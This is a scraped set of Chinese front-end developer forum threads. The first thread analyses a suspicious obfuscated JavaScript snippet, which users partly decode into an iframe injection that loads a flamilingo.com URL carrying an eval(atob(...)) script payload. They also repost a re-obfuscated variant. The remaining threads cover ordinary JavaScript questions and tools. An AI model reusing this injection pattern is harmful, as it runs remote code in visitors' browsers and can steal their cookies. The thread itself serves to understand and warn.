\"\\\\\" + $$.__$ + $$._$_ + $$.$$$ + \"\\\\\" + $$.__$ + $$._$$ + $$.__$ + $$._$ + $$.$_$_ + \"\\\\\" + $$.__$ + $$.__$ + $$.___ + \"\\\\\" + $$.__$ + $$._$_ + $$._$_ + $$.___ + $$.$$__ + \"\\\\\" + $$.__$ + $$.___ + $$._$$ + $$.$_$ + \"\\\\\" + $$.__$ + $$.$$$ + $$.__$ + \"\\\\\" + $$.__$ + $$._$$ + $$._$_ + \"\\\\\" + $$.__$ + $$._$_ + $$.$$$ + \"\\\\\" + $$.__$ + $$.___ + $$.$$_ + \"\\\\\" + $$.__$ + $$.$_$ + $$._$$ + $$.$$$_ + \"\\\\\" + $$.__$ + $$._$_ + $$.$$_ + \"\\\\\" + $$.__$ + $$.__$ + $$.$$_ + $$.___ + \"\\\\\" + $$.__$ + $$._$$ + $$.__$ + \"\\\\\" + $$.__$ + $$._$$ + $$.___ + \"\\\\\" + $$.__$ + $$._$_ + $$._$_ + (![] + \"\")[$$._$_] + \"\\\\\" + $$.__$ + $$.__$ + $$.__$ + \"\\\\\" + $$.__$ + $$", "Javascript is not Java.", "这个贴到 console 里面执行报错唉...", "跑了一下，死机了", "这是一段充满金钱气息的代码", "$$$  :  7\r", "$$$$  :  \"f\"\r", "$$$_  :  \"e\"\r", "$$_  :  6\r", "$$_$  :  \"d\"\r", "$$__  :  \"c\"\r", "$_$  :  5\r", "$_$$  :  \"b\"\r", "$_$_  :  \"a\"\r", "$__  :  4\r", "$__$  :  9\r", "$___  :  8\r", "_$$  :  3\r", "_$_  :  2\r", "__$  :  1\r", "___  :  0", "可以， JS 跑到 Java 来问。\r", "\r", "这段 JS 建议浏览器隐身模式开空标签来执行，尽量消除风险。", "  \r", "\r", "这段 JS 代码我也不太懂，分析一下，先对其中 f.setAttribute('src', 后面那段进行 decode ，可以看到 flamilingo 这个网址，还有一段脚本；那段脚本也是经过 Base64 加密，实际是一段 Ajax 请求，请求内容也是一段代码。\r", "不太清楚有什么作用，大胆猜测是 XSS 。", " 目测是哪个灰色产业里面的代码 变量啥的都是混淆过的 没事儿别乱跑 免得自己 cookie 啥的不知不觉的跑进去", "摔", "这是要测试 Javaer 啊😄", "黑产无敌", "这不是一段 js ，这是一堆鸡屎😊😊😊", "？？？无敌", "先看第一行第二行代码是拼接 ASCII 字符串转换混淆，见７楼。\r", "最后一行很长代码看到到很多双引号　“  之间一大堆代码　“。\r", "推断最外两个双引号应该是混淆的一些代码的一个 String 。执行的时候 ASCII 字符码转换成字符再拼接起来一个 String ，再执行。\r", "\r", "先复制第一行第二行到浏览器 console 里执行，得到转换规律。\r", "再复制最后一句代码最外测２个双引号之间的内容到浏览器里执行得到：\r", "\r", "\"\\11(fu\\156ct\\151o\\156\\40a\\156o\\156\\171\\155ou\\163()\\40{\\12\\12\\11\\11\\11\\166a\\162\\40f\\40=\\40docu\\155e\\156t.c\\162eate\\105le\\155e\\156t('\\151f\\162a\\155e');\\12\\11\\11\\11f.\\163et\\101tt\\162\\151bute('\\163\\162c',\\40'\\150tt\\160://\\167.fla\\155\\151l\\151\\156\\147o.co\\155/e\\163/\\155lea\\162\\156\\151\\156\\147?offe\\162=233&\\160a\\162t\\156e\\162_\\151d=%27%3\\105%3\\103\\163c\\162\\151\\160t%20\\163\\162c=data:%26co\\155\\155a;e\\166al(atob(%27\\103\\147\\153\\112\\103\\121lod\\110\\122\\167 …'\\167\\162a\\160\\160e\\162').a\\160\\160e\\156d\\103\\150\\151ld(f);\\12\\11\\11\\12})();\"\r", "\r", "ASCII 转换成字符就是就是：\r", "(function anonymous() {\r", "\r", "    var f = document.createElement('iframe');\r", "    f.setAttribute('src', '", " …'\r", "    wrapper\r", "    ').appendChild(f);\r", "\r", "})();\r", "\r", "第 3-6 行还没有看明白。", "黑客无敌混淆", "黑客应该用这样的混淆\r", "\r", "```\r", "!function(n){!function(n,t,i,o,r,u,f,c,e,a,h,v,d,g,l,s,b,k,m,p,w){!function(){var t=n[o][i](r);t[u](f,c),t[u](e,a),t[u](h,v),t[u](d,g),t[u](l,s),t[u](b,k),n[o][p](w)[m](t)}()}(this,void 0,n(0,1,2,3,4,2,5,6,2,7,2,8,4),n(9,10,0,11,7,2,8,4),n(12,13,1,3,7,2),n(14,2,4,15,4,4,1,12,16,11,4,2),n(14,1,0),n(17,4,4,18,19,20,20,21,22,13,6,3,7,12,6,12,8,23,10,22,0,10,7,20,2,14,20,7,6,2,3,1,8,12,8,23,24,10,13,13,2,1,25,26,27,27,28,18,3,1,4,8,2,1,29,12,9,25,30,26,31,30,27,5,30,27,32,14,0,1,12,18,4,30,26,33,34,33,35,36,37,6,2,38,39,18,40,27,41,42,32,23,43,44,32,39,6,10,9,38,37,21,45,8,46,6,16,7,39,10,16,8,36,14,16,32,43,31,32,23,43,25,30,26,31,47,47,48,0,10,8,14,10,6,2,22,6,10,23,49,30,26,31,41,30,26,31,47,50,30,26,31),n(12,9),n(12,13,1,41),n(17,2,12,23,17,4),n(51,27,52,18,53),n(14,0,1,10,6,6,12,8,23),n(8,10),n(14,4,54,6,2),n(10,18,3,0,12,4,54,19,33,52,48),n(14,3,8,9,16,10,53),n(3,6,6,10,21,50,14,0,1,12,18,4,14,33,3,6,6,10,21,50,13,10,1,7,14,33,3,6,6,10,21,50,14,3,7,2,50,10,1,12,23,12,8),n(3,18,18,2,8,9,32,17,12,6,9),n(23,2,4,5,6,2,7,2,8,4,55,54,56,9),n(21,1,3,18,18,2,1))}(function(n){return function(){for(var t=arguments,i=\"\",o=0,r=t.length;o<r;o++)i+=n[t[o]];return i}}([\"c\",\"r\",\"e\",\"a\",\"t\",\"E\",\"l\",\"m\",\"n\",\"d\",\"o\",\"u\",\"i\",\"f\",\"s\",\"A\",\"b\",\"h\",\"p\",\":\",\"/\",\"w\",\".\",\"g\",\"?\",\"=\",\"2\",\"3\",\"&\",\"_\",\"%\",\"7\",\"C\",\" \",\"…\",\"Z\",\"V\",\"R\",\"H\",\"Q\",\"O\",\"1\",\"9\",\"k\",\"J\",\"L\",\"N\",\")\",\";\",\"(\",\"-\",\"4\",\"0\",\"x\",\"y\",\"B\",\"I\"]));\r", "```", "感觉还是不要去执行，要执行也搞个隐身模式执行。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>不涉及验证码的，直接一个按钮</p>\n</div></div>"], "reply": "14", "tittle": "各位大神有没有 PT 站自动签到的脚本", "comment": ["[qiandao.today]( ", ") ?", " 有没有简单点的油猴脚本 PT 站内的", "用抓包软件分析下，用 curl 就好了。\r", "复杂点用 python 也不错。\r", "selenium + phantomjs 对配置要求高一些。", "正经 pt 站点主要不是刷上传量", "给账号帮做", "来个邀请码先", "那么好还有签到奖励\r", "我的站都没有。", "你们还敢玩脚本啊", " 感觉不用那么复杂，很简单的吧", " 不作弊啊，脚本站还有“说谢谢”的，就一个模拟点击，也不用输入验证码，瓷器的", " 真的吗，手动滑稽", " 三楼就是常规思路", "u2 的谁能自动签到。", "我就是用 curl 带 cookie 访问完成一个月在线一次."]},
{"content": ["<div class=\"topic_content\">公司有个项目需要实现图片滤镜功能，用户上传一组大图（几十张图片、每张大小 3~50M 不等），需要实现图片的简单滤镜及亮度、对比度调整等功能。\r<br>\r<br>目前我是这样处理的，上传的图片服务器端先进行压缩，提供 1000px 分辨率的缩略图到前端，然后采用 <a target=\"_blank\" href=\"http://camanjs.com/\" rel=\"nofollow\">http://camanjs.com/</a> 这个 js 滤镜插件进行处理，当对 1000px 缩略图进行滤镜及其他操作时，效率都是不错的，但是项目最终需要实现对大图（ 6000 * 3000px ）进行滤镜操作然后保存至服务器端，这时候就出现效率问题了，经常出现浏览器卡死机内存溢出。。试过几个开源的基于 canvas 的滤镜 js 插件，对于大图几乎都是会出现性能问题。\r<br>\r<br>请问下有没有这样的开源解决方案，前端采用缩略图进行滤镜预览操作，最后保存的时候大图的操作放到服务器端进行，谢谢！</div>"], "reply": "10", "tittle": "图片滤镜前端及后端解决方案", "comment": ["js 对图形处理的效率是非常差的，如果访问量不大，可以用后端 c++的开源库做处理。", " 怎样处理用户预留和最终保存的大图效果一致呢，谢谢。如果全部放到服务器端处理，用户在前端操作的时候，需要大量的等待时间，这样体验应该不会太好。", " 打错了，怎样处理用户预览和最终保存的大图效果一致", "前端对小图进行操作展示，保存前端操作的参数，传到后台用 c 处理", "腾讯的 HTMl5 图片处理库：[AlloyImage]( ", "我是直接交给浏览器处理的 用 datauri 再转成 blob 放到 multipart 发送到后端", " 我点进去 404..", "camanjs 不是既能跑在浏览器又能跑在 node 里吗？那就浏览器做小图预览，数据传到 node 做大图吧。", "如果你需要一个基于前端的图片压缩： ", "canvas-compress 导出的是 Blob 对象，可以用 [URL.createObjectURL()]( ", ") 创建引用写入到 `<img>` 元素里，然后再配合你现在使用的 camanjs 就可以了 ;)"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"https://zhuanlan.zhihu.com/p/22478261\" rel=\"nofollow\">https://zhuanlan.zhihu.com/p/22478261</a></div>"], "reply": "目前尚无回", "tittle": "使用 Rollup 和 Buble 编译 JS 库", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>网站改版时公司射击湿给了个这样的<a href=\"http://chenjunhao.cn/circleProgress\" rel=\"nofollow\">圆圈进度条</a>，没搜到现成的，就自己用 canvas 画了一个 😄  可还行？</p>\n<p><a href=\"https://github.com/ThomasChan/CircleProgress\" rel=\"nofollow\">Git 地址</a></p>\n</div></div>"], "reply": "19", "tittle": "圆圈进度条，来骗 Star 了😂", "comment": ["想要一个猫咪扭来扭去的进度条ヽ(•̀ω•́ )ゝ", "不用 canvas 也能做", " (￣ ￣|||)   怎么扭   你是说[这个表情]( ", " 2333", " 不会   不知道用 css 的话那个小圆怎么定位", "你已经成功的引起了我的注意", "给大家分享一个国外的在线且免费 Loading 生成的网址\r", "\r", "\r", "有兴趣的可以关注下我的公众号！", "再来一个 CSS 生成的 loading\r", "其实可以用纯 css 。。。。", " 😂😂好魔性", " 三角函数，很容易的", " (ノ*ﾟ▽ﾟ*)  额  不会啊  请不吝赐教", "对 retina 屏支持的不很好呀，数字比较模糊", " 嗯可以了", "+1", "给你报个 bug ，你那个 demo 页面连续点 restart 的话，速度会越来越快", "楼上是专业找 bug 的", " 确实， 👍，已修复", "已经关注", "上面这几个都不错，直接 Mark"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Github 地址：<a href=\"https://github.com/thundernet8/str2hex\" rel=\"nofollow\">点我</a></p>\n<p>Ext-Gantt 库的代码就是这种做法\n<img alt=\"ExtGantt\" src=\"http://7qndff.com1.z0.glb.clouddn.com/others/ext-gnt.PNG\"></p>\n<p>下面直接复制 README 了，有兴趣的可以用 npm 下载配合 gulp pipe 试一试</p>\n<h1>Note</h1>\n<p>This is a package modified from <a href=\"https://www.npmjs.com/package/confusion\" rel=\"nofollow\">confusion</a></p>\n<h1>About</h1>\n<p>Sometimes, we want to obfuscate our source code to against theft or abuse.</p>\n<p><strong>Confusion</strong> makes it harder to decipher your code by replacing string literals\nand property accesses with lookups into a string map.</p>\n<p><strong>Gulp-str2hex</strong> inherit the basic functionality of Confusion, integrate with gulp, and also bring some enhancement.</p>\n<ul>\n<li>Convert strings and object property names to Hex string like '\\x00' (None ASCII char to '\\u0000' unicode)</li>\n<li>Compress the code, remove comments, new lines, spaces()</li>\n</ul>\n<h2>Install</h2>\n<p>use npm:</p>\n<pre><code>npm install gulp-str2hex --save\n</code></pre>\n<h2>Example</h2>\n<p>This code snippet:</p>\n<pre><code>var cnStr = \"中文测试\";\nvar enStr = 'This is a sentence in English';\n \nString.prototype.myLog = function () {\n    console.log('&gt;&gt; ' + str + ' &lt;&lt;');\n};\n</code></pre>\n<p>will be converted to</p>\n<pre><code>var cnStr = '\\u4e2d\\u6587\\u6d4b\\u8bd5';\nvar enStr = '\\x54\\x68\\x69\\x73\\x20\\x69\\x73\\x20\\x61\\x20\\x73\\x65\\x6e\\x74\\x65\\x6e\\x63\\x65\\x20\\x69\\x6e\\x20\\x45\\x6e\\x67\\x6c\\x69\\x73\\x68';\nString[['\\x70\\x72\\x6f\\x74\\x6f\\x74\\x79\\x70\\x65']][['\\x6d\\x79\\x4c\\x6f\\x67']] = function () {\n    console[['\\x6c\\x6f\\x67']]('\\x3e\\x3e\\x20' + str + '\\x20\\x3c\\x3c');\n};\n</code></pre>\n<p>or use string map</p>\n<pre><code>var _x28494 = [\n    '\\u4e2d\\u6587\\u6d4b\\u8bd5',\n    '\\x54\\x68\\x69\\x73\\x20\\x69\\x73\\x20\\x61\\x20\\x73\\x65\\x6e\\x74\\x65\\x6e\\x63\\x65\\x20\\x69\\x6e\\x20\\x45\\x6e\\x67\\x6c\\x69\\x73\\x68',\n    '\\x6d\\x79\\x4c\\x6f\\x67',\n    '\\x70\\x72\\x6f\\x74\\x6f\\x74\\x79\\x70\\x65',\n    '\\x6c\\x6f\\x67',\n    '\\x3e\\x3e\\x20',\n    '\\x20\\x3c\\x3c'\n];\nvar cnStr = _x28494[0];\nvar enStr = _x28494[1];\nString[_x28494[3]][_x28494[2]] = function () {\n    console[_x28494[4]](_x28494[5] + str + _x28494[6]);\n};\n</code></pre>\n<p>or bring all the string through call parameter of &lt;abbr title=\"immediately invoced function expression\"&gt;IIFE&lt;/abbr&gt;:</p>\n<pre><code>(function (_x16425) {\n    'use strict';\n    var cnStr = _x16425[0];\n    var enStr = _x16425[1];\n    String[_x16425[3]][_x16425[2]] = function () {\n        console[_x16425[4]](_x16425[5] + str + _x16425[6]);\n    };\n}.call(this, [\n    '\\u4e2d\\u6587\\u6d4b\\u8bd5',\n    '\\x54\\x68\\x69\\x73\\x20\\x69\\x73\\x20\\x61\\x20\\x73\\x65\\x6e\\x74\\x65\\x6e\\x63\\x65\\x20\\x69\\x6e\\x20\\x45\\x6e\\x67\\x6c\\x69\\x73\\x68',\n    '\\x6d\\x79\\x4c\\x6f\\x67',\n    '\\x70\\x72\\x6f\\x74\\x6f\\x74\\x79\\x70\\x65',\n    '\\x6c\\x6f\\x67',\n    '\\x3e\\x3e\\x20',\n    '\\x20\\x3c\\x3c'\n]));\n\n</code></pre>\n<p>you can also choose only hex some none ASCII chars like Chinese(like what some Chinese to unicode packages to do)</p>\n<pre><code>(function (_x53816) {\n    'use strict';\n    var cnStr = _x53816[0];\n    var enStr = _x53816[1];\n    String[_x53816[3]][_x53816[2]] = function () {\n        console[_x53816[4]](_x53816[5] + str + _x53816[6]);\n    };\n}.call(this, [\n    '\\u4e2d\\u6587\\u6d4b\\u8bd5',\n    'This is a sentence in English',\n    'myLog',\n    'prototype',\n    'log',\n    '&gt;&gt; ',\n    ' &lt;&lt;'\n]));\n</code></pre>\n<p>and compress the code(the uglify-js package will restore what we have converted, so we cannot use it after our working pipe):</p>\n<pre><code>(function(_x37168){'use strict';var cnStr=_x37168[0];var enStr=_x37168[1];String[_x37168[3]][_x37168[2]]=function(){console[_x37168[4]](_x37168[5]+str+_x37168[6]);};}.call(this,['\\u4e2d\\u6587\\u6d4b\\u8bd5','This is a sentence in English','myLog','prototype','log','&gt;&gt; ',' &lt;&lt;']));\n</code></pre>\n<h2>Usage</h2>\n<p>first, import the package</p>\n<pre><code>var str2hex = require('gulp-str2hex');\n</code></pre>\n<p>use with gulp</p>\n<pre><code>gulp.src(['./src/js/*.js'])\n    .pipe(webpack(require('./webpack.config.js')))\n    .pipe(uglify())\n    .pipe(str2hex())\n    .pipe(gulp.dest('./assets/js')) \n</code></pre>\n<p>add some options</p>\n<pre><code>gulp.src(['./src/js/*.js'])\n    .pipe(webpack(require('./webpack.config.js')))\n    .pipe(uglify())\n    .pipe(str2hex({\n        hexall: false,\n        placeholdMode: 2,\n        compress: true\n    }))\n    .pipe(gulp.dest('./assets/js')) \n</code></pre>\n<h2>options</h2>\n<ul>\n<li>\n<p>hexall</p>\n<p>whether hex all strings or not, default: <code>false</code></p>\n</li>\n</ul>\n<p>available values: <code>true</code> or <code>false</code></p>\n<ul>\n<li>\n<p>placeholdMode</p>\n<p>how to map the strings, default: <code>0</code></p>\n</li>\n</ul>\n<p>available values:</p>\n<pre><code>0 - keep string in their positions,\n1(alias `prependMap`) - use a array includes all the strings, and expose the array as a variable prepend the code;\n2(alias `wrapWithIife`) - use a array includes all the strings, and use Iife to wrap the array as a parameter of the function;\n</code></pre>\n<ul>\n<li>\n<p>compress</p>\n<p>compress the code, remove new lines, comments and spaces, instead of <strong>uglify-js</strong>, default true</p>\n<p>available values: <code>true</code> or <code>false</code></p>\n<p><strong>note:</strong>\nif you use uglify-js, must make the pipe before our package pipe, otherwise the hex string will be restored.</p>\n</li>\n</ul>\n</div></div>"], "reply": "3", "tittle": "升级了个 npm 包，基于 gulp 的 JavaScript 代码混淆，字符串转 16 进制\\x00 或者\\u0000 的工具", "comment": ["整体不错不过\r", "1. 不要集成 uglify-js 因为 单一职能 我认为没有集成 uglify-js 的必要性\r", "2. 请求支持 SourceMaps 支持。（支持的话才能方便调试）\r", "3. options.hexall 可以考虑增加随机选项\r", ">> '\\u4f60\\x2D\\u{597D}\\45' // unicode escape && hex string && octal string 随机混合\r", "<< \"你-好%\"\r", "see ", "\r", "4. 可以考虑引入基于 RegExp 的描述方式\r", ">> /Test/.source\r", "<< \"Test\"\r", "see ", "前端或者后端搞这个有什么意义？", " 对付 bot"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>靠 js 吃饭的伙伴们，你们准备好了吗？可惜我没有邀请</p>\n<p><a href=\"http://ww1.sinaimg.cn/bmiddle/a9bc5c6bgw1f81n3da02tj20zk0ouadt.jpg\" rel=\"nofollow\">http://ww1.sinaimg.cn/bmiddle/a9bc5c6bgw1f81n3da02tj20zk0ouadt.jpg</a></p>\n</div></div>"], "reply": "110", "tittle": "隐约觉得微信小程序会让国内 js 工程师的待遇得到质的飞越", "comment": ["我来翻页", "感觉这还只是第一步：开发者关注.至于第二步：开发，涉及难度，接受程度等等以及第三步用户是否买账.都还需要验证", "今天就有微信小程序系列教程了", "这个头像- - 不是风暴的神奇比利么 2333", " 叫嚣的是一帮前端，不要将其与后端相提并论。前端也能低门槛入门 PHP ，也能低门槛入门 Java ，同样也能低门槛入门 Node.js 。", "我觉得很有前途，说不定以后微信就演变成一个国产系统，然后大家都围绕这个平台开发 App ，形成一个类似 Android 和 iOS 的环境。接下来......我们的后代就再也看不到谷歌和 Android 的了。", " 这个脑洞我不服！", "会让 js 语言相关的软件培训行业有质的飞跃\r ", "其实挺好的，之前也做过服务号，感觉功能丰富的服务号其实也就是一个手机 web 网站，全部要写自己的 web 页面和后台，然后接入服务号。\r", "这次小程序其实也就是借鉴了 react-native 的思路，提供了 js 的 native 接口，体验应该会比服务号好一些。", " \r", "\r", "已经下巴掉到了地上，学到了！\r", "\r", "可以看看你的简历吗？ 我想参考参考，哈"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>就是博客里插入了一段 html 代码，如何在这段代码下面添加一个运行代码段的功能呢</p>\n</div></div>"], "reply": "5", "tittle": "如何在博客里插入运行代码的功能", "comment": ["使用 jslint 的插件", "分分钟写一个出来：\r", "<textarea id=\"code\" cols=\"40\" rows=\"10\"></textarea><br>\r", "<input type=\"button\" value=\"运行代码\" id=\"run\">\r", "<script>\r", "\twindow.onload=function(){\r", "\t\tvar run=document.getElementById('run');\r", "\t\tvar code=document.getElementById('code');\r", "\t\t\r", "\t\trun.onclick=function(){\r", "\t\t\tvar win=window.open('about:blank','_blank');\t\r", "\t\t\twin.document.write(code.value);\r", "\t\t\t//强制从缓存区输出内容\r", "\t\t\twin.document.close(); \r", "\t\t}\t\r", "\t}\r", "</script>", "那太老土了。 接入 codepen", "在想怎样能更安全……\r", "一个选择是在代码中找出所有的疑似标识符的东西，然后造出一个以这些标识符为键的对象，把代码都放在一个 with 这个对象的块里面\r", "要么是在 window 下找出所有的键，然后造出一个以这些键为键的对象，把代码都放在一个 with 这个对象的块里面\r", "\r", "感觉前一种做法最经济，当然最好是同时限制代码的长度", "啊前一种的话要把 eval 作为特例加进去"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>前端小白，最近在看 vue todos 的源码，第一行就看不懂。</p>\n<pre><code>(function (exports) {\n\t...\n})(window);\n</code></pre>\n</div></div>"], "reply": "7", "tittle": "exports 放到函数形参里是啥意思？", "comment": ["这时候 exports 就是 window 对象?", "这是一个 IIFE ，用来避免污染全局作用域。需要导出的东西挂在 window 上，比如 exports.xxx = xxx ，这样外面就能调用 xxx 了。", "为了封装好全局变量", " 说错了，是局部", "避免变量泄漏到全局，这是良好的编码规范", "方便构建工具压缩代码，减少代码体积，因为 window 是全局变量名", "(function (exports){ .... }) 定义了一个匿名函数，参数叫做 exports ，然后以 window 为实参调用了这个函数。\r", "\r", "这样的好处是，除了在这个函数内显式地添加到 window 中的变量，其他的变量都是局部的，不会泄露到全局去。\r", "\r", "还有一个额外的好处，在函数内部的第一行可以用 'use strict' 声明使用严格模式，不用担心代码合并时出错。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>前不久 GitHub 的首页迎来了近几年最大的更新，个人开发了一个 commits 展示图表工具。</p>\n<p>欢迎使用</p>\n<p><a href=\"https://chrome.google.com/webstore/detail/apaldppjjcjgjddfobajdclccgkbkkje\" rel=\"nofollow\">https://chrome.google.com/webstore/detail/apaldppjjcjgjddfobajdclccgkbkkje</a></p>\n<p>源代码地址</p>\n<p><a href=\"https://github.com/Sobranier/github-chart\" rel=\"nofollow\">https://github.com/Sobranier/github-chart</a></p>\n<p>欢迎 star ，更加欢迎 pr</p>\n<p><img alt=\"demo\" src=\"http://static-file-pdd.oss-cn-hangzhou.aliyuncs.com/image/gc-chart-1.png\"></p>\n<p><img alt=\"demo\" src=\"http://static-file-pdd.oss-cn-hangzhou.aliyuncs.com/image/gc-chart-2.png\"></p>\n</div></div>"], "reply": "18", "tittle": "新版 GitHub 的首页 commit 图表展示工具，欢迎使用，欢迎 PR", "comment": ["可以缩放或者切换吗？像这个一样 ", "\r", "\r", "全都展开，占用太大空间了", " \r", "\r", "很好玩，我突然想到，每天都很多算不算全天候程序员_(:з」∠)_", "正在考虑，上一个版本也是这样的，这个版本做的时候就是想让用户一下子看到更多的信息，因为很多时候你可能不太能想到去切换标签看各个界面。如果你有兴趣，可以本地调试一下加上折叠的效果呀，然后给我们的项目发 pr 。\r", "\r", "现在比 Isometric Contributions 的优势在于 图标是基于 svg 的，美感上有提升，另外还加入了两个图", "   见上条", " 是的，可以很容易看到一个人的编程习惯，有些人从来不在非工作日编码。。。。\r", "\r", "现在仅仅有全年的分析和基于周日期的分析，将来还想假如更加有意思的分析图表", " 有兴趣的话可以一起添砖加瓦，虽然一开始是一个小项目，但是目前也有一些 star ，并且有 160+的活跃用户了", "readme 里的图糊掉了\r", "\r", " github 好像对图片做了特殊处理，有些 png 图（有可能是图片尺寸问题就变成了这样）\r", "晚些时候会再上传点新图", "山寨的这个？ ", "   很早的时候重制了这个图表，比他的更加优化，我们这个项目也有一年多的历史了", "去点了原项目的 star :D", " 这个看个人喜好。。。\r", "代码层面是毫无关系的，而且这里有三个图表，实现也比他的更优。 canvas 的实现还会有放大不清晰的问题", " \r", " 周末向程序员（因为我是学生啊）", "赞一个👍", "能不能加个 ", " 的展示", "切换 年份 图表消失", " 恩 监控点击 dom 切换的事件还没有添加，最近加上，有兴趣的可以一期", " 你好，暂时可能不会= =，因为我自己不用 ", " 啊"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://i.imgur.com/uHr0VKK.png\"><img src=\"http://i.imgur.com/uHr0VKK.png\" border=\"0\" class=\"embedded_image\"></a></div>", "<div class=\"topic_content\">总结两点: 1. var 的声明会拉到函数顶部. 2. closure 闭包内保留的是变量引用\r<br>\r<br>确实是忘了第二点了... \r<br>\r<br>不过还是有点没明白为什么用 let 就解决这个问题了呢?</div>", "<div class=\"topic_content\">其实不仅仅是作用域的问题, 关键是: 引用吓 @<a target=\"_blank\" href=\"/member/wizardforcel\">wizardforcel</a> 的话,  每个函数在调用时都会有一个帧，局部变量当然是存到帧里面。但是有的帧在函数返回时会销毁， lz 这种情况不会。因为函数中的函数会关联外层函数的帧，这个帧还有函数在用就没法销毁</div>"], "reply": "41", "tittle": "记 js 的一个小坑", "comment": ["var i = 0; \r", "for(; i<3; i ++){\r", "  funcList.push(function(){\r", "    console.log(i);\r", "  })\r", "}\r", "\r", "这样不就好理解了吗。。。", "执行函数的时候才去读 i 的值", "经典坑 Number 0", "for 小括号里面第一个语句，定义的变量 i ，是全局变量 i ，没什么不好理解的吧", "JS 在 ES6 之前 for 循环没有块作用域", "var funcs = [];\r", "for (var i = 0; i < 3; i++) {\r", "    (function(i) {\r", "        funcs.push(function() {\r", "            console.log(i);\r", "        });\r", "    })(i);\r", "};", "论 ES6 的巨大进步", "没什么不好理解的， var 定义的 i 是全局的，等你在第二个循环里面调用的时候才去读 i 的值，这个时候的 i 已经经过第一个循环然后变成 3 了。你把 var 换成 let ，这样定义的 i 只在第一个循环里面起效果，就不会出现这样的问题了。可以去看看 ES6 的块级作用域。", "用 let...", "let let let", "不用 let 也能解决  只要控制好作用域就行了\r", "\r", "var funclist = [];\r", "\r", "var func = function(a){\r", "    funclist.push(function(){console.log(a)});\r", "};\r", "\r", "for(var i = 0; i < 3; i++){\r", "    func(i);\r", "}\r", "\r", "for(var j = 0; j < 3; j++){\r", "    funclist[j]();\r", "}", "入门问题", "如非必要就别用旧标准了， let 已经得到广泛支持。", "let 替换 var 就 O 了", "问个小白问题，这个菊部变量 i 存哪了？\r", "更正： 菊>局", "一点开我就猜是这个问题，😄太经典。", "闭包内保留的是变量引用", "典型的闭包问题", "搞不懂 var ，最后去用 let 。\r", "呵呵。", "所以 es6 中使用 let 了", "ES6 的实现：\r", "\r", "[1,2,3].map( num=>()=>console.log(num) ).forEach(fn=>fn())\r", "\r", "在大部分的情况下 map, filter, reduce, forEach 代替 for 要简单的多", "再彻底一点：\r", "\r", "[...Array(3).keys()].map( num=>()=>console.log(num) ).forEach(fn=>fn())", "别再用 var 了，全部用 let", " 嘘。。。 无需更正，了解你了", "安利下 「 ES6: 快速体验，及实用小贴士」 ", "  ![]( ", ")  看的讲闭包的都没讲到原型结构啊，今天终于知道 closure 是怎么来的了", "入队的时候没有执行 console.log 啊", "楼上的各位说用 let 的，现在没人敢直接在生产环境下直接用 let 吧？都是要 babel 编译之后才能用的。如果只是一个小程序的话，上 babel 的成本又太高了", "因为 let 提供了块级作用域", "1. 闭包不是 js 专利, 在 gopl 上看到 golang 也有这个问题\r", "2. 使用 let 解决的解释 \r", "\r", "- ", "\r", "- ", "\r", "- ", " 赞\r", " 卧槽，看不懂\r", "\r", " 先学习了", " 成本高在哪？编译出来大小增加不大啊。\r", "如果用到一些增强的内置函数需要挂 polyfill ，但这个可以自己挑需要什么啊，即使全部挂上也没多大。", "用 let...var 有作用域提升的问题..", "let 的作用于是我们常见意义上的块级作用于，而 var 的作用域则仅适用于 function ，一般意义上的 code block 对它没有作用域的限制意义。从编程语言的角度来看， var 声明的变量的作用域部分是不完整的。建议用 let 。\r", "\r", "[“ let ” keyword vs “ var ” keyword in Javascript]( ", ")", "用闭包也能解决吧", " 每个函数在调用时都会有一个帧，局部变量当然是存到帧里面。但是有的帧在函数返回时会销毁， lz 这种情况不会。因为函数中的函数会关联外层函数的帧，这个帧还有函数在用就没法销毁。", "这个可以说是 Javascript 的坑也可以说是 feature 。虽然有意这样写的情况不多见吧。\r", "重要的是要理解编程语言本身，变量的值和引用啊，作用域啊，语法和表达式啊。\r", "如果不重视基本功， ES6 照样会踩坑。\r", "\r", "比如 [1,2,3].map(n => {value: n}) 有人觉得会返回他以为的东西，有人觉得会报错（比如我，我都忘了有 label 这回事）。\r", "但结果是不但不报错还会返回 [undefined, undefined, undefined] 呢。", "JS 的经典问题。\r", "`var` 声明是没有块级作用域的，所以上面的代码等于：\r", "```\r", "var i;\r", "\r", "for (i = 0; i < 3; i++) {\r", "  funcList.push(function() {\r", "    console.log(i);\r", "  });\r", "}\r", "\r", "```\r", "ES5 中可以使用闭包解决， ES6 中直接使用`let`即可。\r", "`let`声明的变量具有块级作用域，所以 3 次循环会产生 3 个不相同（仅同名）的变量`i`，添加入数组中的函数引用的是不同的变量。事实上你在循环的外部先用`let`定义变量`i`，那么结果也都是 3 3 3 ，如下：\r", "```\r", "let funcList = [];\r", "\r", "let i;\r", "for (i = 0; i < 3; i++) {\r", "    funcList.push(() => {\r", "        console.log(i);\r", "    });\r", "}\r", "\r", "for (let j = 0; j < 3; j++) {\r", "    funcList[j]();\r", "}\r", "\r", "```", "想通了这个基本就能填上变量申明提升的坑了\r", "> var myvar = 'global value'; \r", "> (function() {console.log(myvar);var myvar='local value';})();\r", "undefined"]},
{"content": ["<div class=\"topic_content\">个人感觉这本书可以和红宝书相媲美了，作者也同样，不知道国内有没有出版社考虑出版，只希望如果有，译者的功力和李松峰老师，曹力老师一个水准。</div>"], "reply": "4", "tittle": "国内有出版社翻译《Exploring ES6》吗？", "comment": ["哈哈 原来收藏了这本书, 但是没看. 今天通过楼主又找到了. 可以好好看一下了.\r", "\r", "一直有关注这本书的作者的博客的 RSS, 写的都很有深度, 想必写的书会更好", "还为何不看红宝书作者的 understandinges6...", "\r", "\r", "估计难产了 :)", "我推荐 u dont know js"]},
